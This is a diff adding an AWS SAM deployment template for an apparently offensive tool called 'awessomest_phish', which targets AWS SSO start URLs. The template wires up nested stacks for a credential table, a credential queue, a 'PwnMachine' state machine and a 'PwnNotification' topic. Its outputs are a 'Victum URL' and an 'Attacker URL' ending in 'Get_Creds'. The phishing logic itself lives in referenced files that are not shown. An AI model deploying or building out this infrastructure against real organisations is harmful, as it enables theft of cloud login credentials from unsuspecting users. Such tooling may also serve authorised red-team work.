@@ -1,0 +1,97 @@
+AWSTemplateFormatVersion: '2010-09-09'
+Transform: AWS::Serverless-2016-10-31
+Description: >
+  awessomest_phish
+
+  Sample SAM Template for awessomest_phish
+
+
+Parameters:
+  STARTURL:
+    Description: Start URL
+    Type: String
+    Default: https://<ChangeMe>.awsapps.com/start/"
+  REGION:
+    Description: Region
+    Type: String
+    Default: us-east-1
+  STAGE:
+    Description: API GW Stage Name
+    Type: String
+    Default: Prod
+  SNSRECIPIENT:
+    Description: Region
+    Type: String
+    Default: changeme@example.com
+
+Resources:
+  LambdaAndApiStack:
+    Type: AWS::Serverless::Application
+    DependsOn:
+      - QueueStack
+      - DynamoStack
+      - S3Stack
+      - SnsStack
+    Properties:
+      Location: ./cfn_stacks/lambdaapigw.yaml
+      Parameters:
+        STARTURL: !Ref STARTURL
+        REGION: !Ref REGION
+        STAGE: !Ref STAGE
+        STATESARN: !GetAtt PwnMachineStack.Outputs.PwnMachineArn
+        TABLENAME: !GetAtt DynamoStack.Outputs.CredTable
+        TABLEARN: !GetAtt DynamoStack.Outputs.CredTableArn
+        QUEUEURL: !GetAtt QueueStack.Outputs.CredQueueUrl
+        QUEUEARN: !GetAtt QueueStack.Outputs.CredQueueArn
+        CFNBUCKET: !GetAtt S3Stack.Outputs.CFNBucket
+        PWNNOTIFICATION: !GetAtt SnsStack.Outputs.PwnNotification
+
+  PwnMachineStack:
+    Type: AWS::Serverless::Application
+    DependsOn:
+      - QueueStack
+      - DynamoStack
+      - S3Stack
+      - SnsStack
+    Properties:
+      Location: ./cfn_stacks/pwnmachine.yaml
+      Parameters:
+        REGION: !Ref REGION
+        QUEUEURL: !GetAtt QueueStack.Outputs.CredQueueUrl
+        QUEUEARN: !GetAtt QueueStack.Outputs.CredQueueArn
+
+  QueueStack:
+    Type: AWS::Serverless::Application
+    Properties:
+      Location: ./cfn_stacks/sqs.yaml
+
+  DynamoStack:
+    Type: AWS::Serverless::Application
+    Properties:
+      Location: ./cfn_stacks/dynamo.yaml        
+
+  S3Stack:
+    Type: AWS::Serverless::Application
+    Properties:
+      Location: ./cfn_stacks/s3.yaml
+
+  SnsStack:
+    Type: AWS::Serverless::Application
+    Properties:
+      Location: ./cfn_stacks/sns.yaml
+      Parameters:
+        SNSRECIPIENT: !Ref SNSRECIPIENT
+
+
+Outputs:
+  VictumUrl:
+    Description: "Victum URL"
+    Value: !Sub "https://${LambdaAndApiStack.Outputs.Api}.execute-api.${AWS::Region}.amazonaws.com/${STAGE}/"
+
+  AttackerUrl:
+    Description: "Attacker URL"
+    Value: !Sub "https://${LambdaAndApiStack.Outputs.Api}.execute-api.${AWS::Region}.amazonaws.com/${STAGE}/Get_Creds"
+
+
+
+
